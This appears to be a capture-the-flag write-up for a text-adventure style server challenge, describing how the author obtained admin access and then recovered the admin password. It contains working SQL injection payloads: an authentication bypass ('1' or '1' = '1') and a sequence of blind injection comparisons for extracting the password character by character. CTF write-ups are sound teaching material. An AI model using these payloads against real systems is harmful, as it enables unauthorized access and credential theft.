After logging into the server using any username and the 'murphy'
password (wicked security model), you are presented with a
text-adventure style game:

| You are standing in front of a desk in a quiet, windowless office.
| 
| There are posters on the walls. The office door is closed. There is
| a faint smell of tuna.
| 
|      -> look desk
| A large wooden desk sits in the centre of the room. It's
| imposing: you could imagine sitting begin it, stroking your feline
| companion as you plot world domination.
| 
| Unfortunately, there's no chair. There is however a rubbish bin and
| a shredder tucked under the desk, you didn't see them before.
| 
| There is a folder of documents on the desk.

Attempting to pick up the folder gives a message to the effect of
"It's stuck, maybe an admin could do that for you" (sorry blinken I
don't remember your precise words, I'm sure they were more poetic).

Sure enough if you try and login to the server with the username
'admin', the 'murphy' password no longer works.

blinken gave some hints about the admin password:
a) it wasn't necessary to know the actual password to login
b) the password was stored in a database

The two combined suggested sql injection, which is exactly what worked:

| Connecting...
| WeLcOmE to NSA Telepresence
| Remember, if you die in the game, you die in real life
| 
| Repeated authentication failures will result in deployment of tactical response.
| 
| Enter your username
| admin
| Enter your password
| 1' or '1' = '1
| 
| Admin authorised: Dade "Flagtwo" Murphy
| 
| cipherchange:cipher=ARC4:keylen=14:charset=alpha
| 
| Welcome admin!


== BONUS ROUND ==

Obtaining the actual admin password was listed as a bonus objective.
After guessing that the column being checked against was called
"password", I used a series of injections to slowly determine each
character. I didn't log my attempts, but it was along these lines:

BAD:    1' or password > 'm'
GOOD:   1' or password > 'f'
BAD:    1' or password > 'i'
GOOD:   1' or password > 'g'
GOOD:   1' or password like 'h%'
BAD:    1' or password > 'hm'
BAD:    1' or password > 'hf'
GOOD:   1' or password > 'hc'

etc etc. if you want the actual password, do it yourself :P
